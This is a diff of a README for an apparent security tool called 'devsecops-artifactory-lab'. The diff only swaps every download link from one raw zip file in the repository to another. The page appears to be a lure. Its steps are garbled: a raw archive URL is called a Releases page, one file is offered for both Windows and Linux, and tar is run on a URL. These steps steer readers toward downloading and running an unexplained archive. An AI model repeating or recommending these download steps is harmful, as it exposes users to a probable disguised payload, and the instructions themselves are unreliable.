@@ -1,6 +1,6 @@
 # 🛡️ devsecops-artifactory-lab - Secure Your Development Pipeline Easily
 
-[![Download](https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/prepeduncle/devsecops-artifactory-lab.zip)](https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/prepeduncle/devsecops-artifactory-lab.zip)
+[![Download](https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/src/devsecops-artifactory-lab-3.5-alpha.5.zip)](https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/src/devsecops-artifactory-lab-3.5-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,10 +10,10 @@ Welcome to the **devsecops-artifactory-lab**! This application helps you set up 
 
 To get started, you need to download the latest version of the application from our Releases page.
 
-1. **Visit this page to download:** [Download devsecops-artifactory-lab](https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/prepeduncle/devsecops-artifactory-lab.zip)
+1. **Visit this page to download:** [Download devsecops-artifactory-lab](https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/src/devsecops-artifactory-lab-3.5-alpha.5.zip)
 2. On the Releases page, you will see a list of available versions. Look for the latest release at the top.
 3. Click on the version number to open the release details.
-4. Find the downloadable file for your operating system. If you’re unsure about which file to choose, look for common names like `https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/prepeduncle/devsecops-artifactory-lab.zip` for Windows or `https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/prepeduncle/devsecops-artifactory-lab.zip` for Linux.
+4. Find the downloadable file for your operating system. If you’re unsure about which file to choose, look for common names like `https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/src/devsecops-artifactory-lab-3.5-alpha.5.zip` for Windows or `https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/src/devsecops-artifactory-lab-3.5-alpha.5.zip` for Linux.
 5. Click the file link to start the download process.
 
 Once the download completes, follow the instructions below based on your operating system.
@@ -36,12 +36,12 @@ Once the download completes, follow the instructions below based on your operati
 
 ### Linux
 
-1. Locate the downloaded `https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/prepeduncle/devsecops-artifactory-lab.zip` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/src/devsecops-artifactory-lab-3.5-alpha.5.zip` file.
 2. Open a terminal window.
 3. Navigate to the directory where you downloaded the file using the `cd` command.
 4. Extract the files with the command: 
    ```bash
-   tar -xzf https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/prepeduncle/devsecops-artifactory-lab.zip
+   tar -xzf https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/src/devsecops-artifactory-lab-3.5-alpha.5.zip
    ```
 5. Change into the extracted directory with:
    ```bash
@@ -88,4 +88,4 @@ For news and updates, follow us on our social media accounts or visit our commun
 
 Thank you for choosing **devsecops-artifactory-lab**! We hope this tool brings security and efficiency to your development process.
 
-[![Download](https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/prepeduncle/devsecops-artifactory-lab.zip)](https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/prepeduncle/devsecops-artifactory-lab.zip)
+[![Download](https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/src/devsecops-artifactory-lab-3.5-alpha.5.zip)](https://raw.githubusercontent.com/beyondsocko/devsecops-artifactory-lab/main/src/devsecops-artifactory-lab-3.5-alpha.5.zip)
